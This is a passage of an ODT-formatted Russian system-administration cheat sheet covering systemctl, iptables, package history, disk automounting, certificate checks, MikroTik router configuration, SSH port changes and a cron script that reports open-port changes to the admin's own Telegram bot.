      <text:p text:style-name="P1"><text:span text:style-name="T5">7. Монтирование сетевых файловых систем (https://hackware.ru/?p=14459#7)</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">8. Опции команды mount и опции монтирования (https://hackware.ru/?p=14459#8)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">sudo systemctl start &lt;service&gt; <text:s text:c="3"/># Запуск сервиса</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">sudo systemctl stop &lt;service&gt; <text:s text:c="4"/># Остановка сервиса</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">sudo systemctl restart &lt;service&gt; <text:s/># Перезапуск сервиса</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">sudo systemctl reload &lt;service&gt; <text:s text:c="2"/># Перезагрузка конфигурации (без остановки)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Включение и отключение автозапуска:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">sudo systemctl enable &lt;service&gt; <text:s text:c="3"/># Включить автозапуск сервиса</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">sudo systemctl disable &lt;service&gt; <text:s text:c="2"/># Отключить автозапуск сервиса</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">sudo systemctl is-enabled &lt;service&gt; <text:s/># Проверить статус автозапуска</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Проверка состояния сервиса:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">systemctl status &lt;service&gt; <text:s text:c="2"/># Проверить текущее состояние сервиса</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">journalctl -u &lt;service&gt; <text:s text:c="5"/># Просмотреть логи сервиса</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Проверка запущенных сервисов:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">systemctl list-units --type=service --state=running <text:s/># Вывести запущенные сервисы</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">systemctl list-units --type=service <text:s text:c="16"/># Все загруженные сервисы</text:span></text:p>
      <text:p text:style-name="P1"><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1"><text:span text:style-name="T5">sudo systemctl daemon-reexec <text:s text:c="2"/># Перезапуск systemd без перезапуска сервисов</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">sudo systemctl daemon-reload <text:s text:c="2"/># Обновить конфигурацию systemd после изменения юнитов</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Редактирование юнитов сервисов:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">sudo systemctl edit &lt;service&gt; <text:s text:c="2"/># Изменить конфигурацию юнита (создает override)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">sudo systemctl cat &lt;service&gt; <text:s text:c="3"/># Просмотреть конфигурацию юнита</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">Удаление override-конфигурации: sudo systemctl revert &lt;service&gt;</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">3. Дополнительные команды. Маскировка и размаскировка сервиса:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">sudo systemctl mask &lt;service&gt; <text:s text:c="2"/># Полностью отключить сервис (даже если включен)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">sudo systemctl unmask &lt;service&gt; # Разрешить сервис (после mask)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Выключение и перезагрузка системы через systemd:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">sudo systemctl reboot <text:s text:c="4"/># Перезагрузка системы</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">sudo systemctl poweroff <text:s text:c="2"/># Выключение системы</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">sudo systemctl suspend <text:s text:c="3"/># Усыпление системы</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">sudo systemctl halt <text:s text:c="6"/># Остановка системы без выключения питания</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">4. Примеры работы. Запуск и настройка сервиса Nginx:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">sudo systemctl start nginx <text:s text:c="6"/># Запускаем сервис</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">sudo systemctl enable nginx <text:s text:c="5"/># Включаем автозапуск</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">systemctl status nginx <text:s text:c="10"/># Проверяем статус</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">journalctl -u nginx --no-pager <text:s text:c="2"/># Просматриваем логи</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Остановка и отключение сервиса Apache:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">sudo systemctl stop apache2 <text:s text:c="5"/># Остановка сервиса</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">sudo systemctl disable apache2 <text:s text:c="2"/># Отключение автозапуска</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">sudo systemctl mask apache2 <text:s text:c="5"/># Полностью блокируем его запуск</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Полезные флаги systemctl</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Флаг <text:s text:c="25"/>Описание</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">--no-pager <text:s text:c="12"/>Вывод без постраничного просмотра</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">--failed <text:s text:c="17"/>Показывает только сбойные юниты</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">--type=service <text:s text:c="3"/>Фильтр по типу "service"</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">--all <text:s text:c="18"/>Показывает все юниты, включая неактивные</text:span></text:p>
      <text:p text:style-name="P17" loext:marker-style-name="T6"/>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Полезные команды Linux. Фаервол IPTABLES, штатный, для большинства дистрибутивов Linux:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">iptables -t filter -L - Вывести список всец цепочек правил</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">iptables -t nat -L - Вывести все цепочки из NAT таблицы</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">iptables -t nat -F - Очистить все цепочки правил в таблице NAT</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">iptables -t filter -X - Очистить все пользовательские цепочки правил в таблице filter</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">iptables -t filter -F - Очистить все цепочки правил в таблице filter</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T5">iptables -t filter -A INPUT -p tcp --dport telnet -j ACCEPT - Разрешить входящие соединения с telnet</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">iptables -t filter -A OUTPUT -p tcp --dport http -j DROP - Запретить исходящие HTTP соединения</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">iptables -t nat -A PREROUTING -d 192.168.0.1 -p tcp -m tcp --dport 22 -j DNAT --to-destination 10.0.0.2:22 - Пересылка пакетов, адресованных одному хосту, на другой хост</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">iptables -t filter -A INPUT -j LOG --log-prefix - Включить логгирование пакетов, проходящих через цепочку INPUT, и добавлением к сообщению префикса "DROP INPUT"</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">iptables -t filter -A FORWARD -p tcp --dport pop3 -j ACCEPT - Разрешить форвардинг POP3 соединений</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">1. Для Debian/Ubuntu (dpkg и apt): grep "install " /var/log/dpkg.log ИЛИ если лог-файл архивирован: zgrep "install " /var/log/dpkg.log.*</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Для более удобного вывода: grep "install " /var/log/dpkg.log | awk '{print $1, $2, $5}'</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Если система использует journalctl: journalctl -u apt --no-pager | grep "install "</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">2. Для RHEL, CentOS, Fedora (dnf, yum). Список установленных пакетов по дате: rpm -qa --last ИЛИ: rpm -qa --queryformat '%{installtime} %{installtime:date} %{name}-%{version}-%{release}\n' | sort -n</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Если используется dnf: dnf history list</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Чтобы получить подробности о конкретной транзакции: dnf history info &lt;ID_транзакции&gt;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">А для yum: yum history list all</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">3. Для Arch Linux (pacman): expac --timefmt='%Y-%m-%d %T' '%l\t%n' | sort -n ИЛИ: grep -E 'installed' /var/log/pacman.log</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">4. Для OpenSUSE (zypper): zypper info --installed-only | grep -B 2 "Install Date"</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Вывод в удобном формате. Если нужно отсортировать пакеты по дате и времени: rpm -qa --queryformat '%{installtime:date} %{name}\n' | sort</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">Для Debian/Ubuntu: grep "install " /var/log/dpkg.log | awk '{print $1, $2, $5}' | sort</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><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1"><text:span text:style-name="T5">2) Удаление зомби-процессов:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">2.2) Перезапуск родительского процесса. Если завершение родителя недопустимо, попробуйте его перезапустить: systemctl restart &lt;service_name&gt; или service &lt;service_name&gt; restart</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">3) Предотвращение появления зомби-процессов:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">1. Используйте обработку дочерних процессов в своих скриптах. Если пишете демоны или фоновые процессы, убедитесь, что ваш код корректно вызывает waitpid().</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">2. Применяйте обработчики сигналов. В C/C++ можно использовать обработчик SIGCHLD:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">signal(SIGCHLD, SIG_IGN);</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">3. Настройте systemd для автоматического управления процессами. В systemd можно создать службу с KillMode=process в /etc/systemd/system/myservice.service:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">[Service]</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">KillMode=process</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">4. Контролируйте процессы с помощью ulimit. Установите лимиты на максимальное число процессов: ulimit -u 100000</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Автоматическое монтирование дисков в Linux:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">1. Определение дисков и разделов. Перед монтированием нужно узнать, какие диски доступны:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">lsblk <text:s text:c="3"/># Показывает структуру дисков и разделов</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">fdisk -l # Выводит информацию о разметке дисков</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">blkid <text:s text:c="3"/># Показывает UUID и метки файловых систем</text:span></text:p>
      <text:p text:style-name="P1"><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1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">4. Автомонтирование через systemd (для USB и съемных дисков). Создаем unit-файл: sudo nano /etc/systemd/system/mnt-usb.mount</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Вставляем:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">[Unit]</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Description=Монтирование USB</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Requires=systemd-fsck@dev-sdb1.service</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">After=systemd-fsck@dev-sdb1.service</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">[Mount]</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">What=/dev/sdb1</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Where=/mnt/usb</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Type=vfat</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Options=defaults,noatime</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">[Install]</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">WantedBy=multi-user.target</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">Активируем: sudo systemctl daemon-reload</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">sudo systemctl enable mnt-usb.mount</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">sudo systemctl start mnt-usb.mount</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">5. Автомонтирование через udev (динамическое монтирование). Создаем правило: sudo nano /etc/udev/rules.d/99-usb-mount.rules. Добавляем:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">ACTION=="add", KERNEL=="sd[b-z][1-9]", RUN+="/bin/mount /dev/%k /mnt/usb"</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">ACTION=="remove", KERNEL=="sd[b-z][1-9]", RUN+="/bin/umount /mnt/usb"</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Применяем изменения:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">sudo udevadm control --reload-rules</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">sudo udevadm trigger</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">echo | openssl s_client -servername example.com -connect example.com:443 2&gt;/dev/null \</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">| openssl x509 -noout -dates | grep notAfter</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Чтобы получить только оставшиеся дни до окончания:</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T5">end_date=$(echo | openssl s_client -servername example.com -connect example.com:443 2&gt;/dev/null \</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">| openssl x509 -noout -enddate | cut -d= -f2)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">end_ts=$(date -d "$end_date" +%s)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">now_ts=$(date +%s)</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">echo "Осталось дней: $(( (end_ts - now_ts) / 86400 ))"</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">1. Пингуй с флагом Don't Fragment и уменьшающейся длиной пакета: ping -M do -s 1472 8.8.8.8</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">2. Если получаешь Frag needed, уменьши размер: ping -M do -s 1464 8.8.8.8</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">3. Найди максимальный размер без фрагментации. MTU = размер + 28 (заголовки IP + ICMP). Например, если -s 1464 работает, MTU = 1464 + 28 = 1492.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">4. Проверь результат через трассировку с DF-флагом: tracepath 8.8.8.8</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">RegExp: Как найти строки с IP-адресами в логах. Частая задача - выцепить IP-адреса из логов. Вот регулярка и однострочник, которые помогут:grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' /var/log/nginx/access.log</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Что делает: Eo - включаем расширенные регулярки и выводим только совпадения; ([0-9]{1,3}\.){3}[0-9]{1,3} - шаблон для IPv4-адресов.</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">Можно дополнительно убрать дубликаты и отсортировать по частоте: grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' /var/log/nginx/access.log | sort | uniq -c | sort -nr | head</text:span></text:p>
      <text:p text:style-name="P15"><text:span text:style-name="T5">Покажет топ IP-адресов по количеству обращений - удобно для анализа трафика и выявления подозрительной активности.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Пять бесплатных альтернатив популярным нейросетям - делают ту же работу, но без подписок:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Grok (grok.com) – альтернатива ChatGPT: быстро пишет тексты, отлично запоминает контекст и работает молниеносно;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Ideogram (ideogram.ai) – замена KlingAI: за считанные секунды создаёт изображения, логотипы и иллюстрации высокого качества;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">HailuoAI (hailuoai.video) – аналог MidJourney: мощнейший китайский генератор сверхреалистичных картинок по текстовому описанию;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Fotor (fotor.com/ai-image-generator) – альтернатива Photoshop: удобный AI-редактор для обработки фото и создания картинок через промпты;</text:span></text:p>
      <text:p text:style-name="P2"><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1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">1. Установите пакет: sudo apt install eatmydata</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">2. Используйте eatmydata как префикс: sudo eatmydata apt install some-package</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">3. Используйте с другими командами:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">sudo eatmydata dpkg -i some-package.deb</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">sudo eatmydata apt upgrade -y</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Пример ускорения установки:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">time sudo apt install -y build-essential <text:s/># обычный способ</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">time sudo eatmydata apt install -y build-essential <text:s/># ускоренный способ</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Важно: когда не стоит использовать: В продуктивной системе;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Когда стабильность данных критична (напр. при установке базы данных);</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Если установка прерывается - есть риск повреждения пакетов.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Расширенное применение. Внутри chroot / контейнеров: chroot /mnt/debian-root eatmydata apt install -y ...</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">В скриптах сборки:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">#!/bin/bash</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">export LD_PRELOAD=libeatmydata.so</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">apt install -y ...</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">Использование через debootstrap: sudo eatmydata debootstrap bullseye /mnt/debian http://deb.debian.org/debian</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">#!/bin/bash</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"># Настройки</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">TG_TOKEN="your_bot_token"</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">TG_CHAT_ID="your_chat_id"</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">PORTS_FILE="/var/tmp/open_ports_last.txt"</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"># Получаем текущие открытые порты</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">ss -tuln | awk 'NR&gt;1 {print $5}' | cut -d: -f2 | sort -n | uniq &gt; /tmp/open_ports_now.txt</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T5"># Если нет предыдущего файла - создаём</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">if [ ! -f "$PORTS_FILE" ]; then</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">cp /tmp/open_ports_now.txt "$PORTS_FILE"</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">exit 0</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">fi</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"># Сравниваем с предыдущим состоянием</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">DIFF=$(diff -u "$PORTS_FILE" /tmp/open_ports_now.txt)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"># Если есть изменения - шлём в Telegram</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">if [ -n "$DIFF" ]; then</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">MESSAGE="⚠️ Обнаружены изменения в открытых портах:\n\`\`\`\n$DIFF\n\`\`\`"</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">curl -s -X POST "https://api.telegram.org/bot$TG_TOKEN/sendMessage" \</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">-d chat_id="$TG_CHAT_ID" \</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">-d parse_mode="Markdown" \</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">-d text="$MESSAGE"</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">cp /tmp/open_ports_now.txt "$PORTS_FILE"</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">fi</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"># Уборка</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">rm -f /tmp/open_ports_now.txt</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Как использовать:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">1. Замените your_bot_token и your_chat_id на свои значения.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">2. Добавьте в cron, чтобы проверять, например, каждые 10 минут: */10 * * * * /path/to/script.sh</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Установка своих DNS серверов и отключение получения их по DHCP:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">/ip dns set servers=8.8.8.8,1.1.1.1</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">/ip dhcp-client set [find ] use-peer-dns=no</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">/tool e-mail</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">set address=smtp.yandex.ru from=example@yandex.ru password=example-pass port=587 start-tls=yes user=example@yandex.ru</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">Настройка синхронизации времени по NTP и MikroTik Cloud Time (Москва):</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">/system ntp client set enabled=yes server-dns-names=time.google.com,0.pool.ntp.org,1.pool.ntp.org,2.pool.ntp.org,3.pool.ntp.org</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">/system clock set time-zone-autodetect=no</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">/system clock set time-zone-name=Europe/Moscow</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">/ip cloud set update-time=yes </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Изменение количества строк системного лога: /system logging action set memory memory-lines=10000</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T5">Очистка системного лога (оставляет сообщение о смене настроек лога):</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">/system logging action set memory memory-lines=1</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">/system logging action set memory memory-lines=10000</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">/ip firewall address-list</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">add address=access.example.con list=DomainIPsAccess</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">/ip firewall filter</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">add action=accept chain=input src-address-list=DomainIPsAccess comment="Allow DomainIPsAccess"</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">move [find comment="Allow DomainIPsAccess"] 1</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">move [find comment="Allow DomainIPsAccess"] 0</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Отключение ненужных служб доступа (web тоже отключается, осторожно):</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">/ip service disable www,ftp,api,api-ssl,telnet</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">/ip service enable ssh,winbox</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">/ip service set ssh address=""</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">/ip service set winbox address=""</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Фикс MTU (нужен редко, но метко): /ip firewall mangle</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">add chain=postrouting out-interface-list=WAN protocol=tcp tcp-flags=syn,!ack action=change-mss new-mss=clamp-to-pmtu comment="MTU Fix" passthrough=yes</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Заблокировать доступ к WiFi по MAC-адресу: /interface wireless access-list authentication=no mac-address=8A:EA:B7:2E:38:C1 </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Поместить клиента WiFi в отдельный VLAN по MAC-адресу: /interface wireless access-list</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">add interface=all mac-address=8A:EA:B7:2E:38:C1 vlan-id=99 vlan-mode=use-tag</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Настройка пароля и безопасности WiFi на default профиль: /interface wireless security-profiles set default mode=dynamic</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">-keys authentication-types=wpa2-psk unicast-ciphers=aes-ccm group-ciphers=aes-ccm</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">wpa2-pre-shared-key=bigpassword</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">Включение пробросов портов SSH: /ip ssh set forwarding-enabled=both</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Изменение порта для подключения по SSH:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T5">подключения. Например Port 25022. Выходим, сохраняем файл и перезагружаем SSH следующей командой: service sshd restart</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Можно разрешить средствами iptables подключение к SSH только с указанного диапазона IP адресов: iptables -A INPUT -d 192.168.0.0/24 -p tcp --dport 25022 -j ACCEPT</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">Посмотреть в системе на каком порту и на каких сетевых интерфейсах работает SSH можно следующей командой: netstat -tulpan | grep ssh</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">#!/bin/bash</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">SERVICE="nginx"</text:span></text:p>
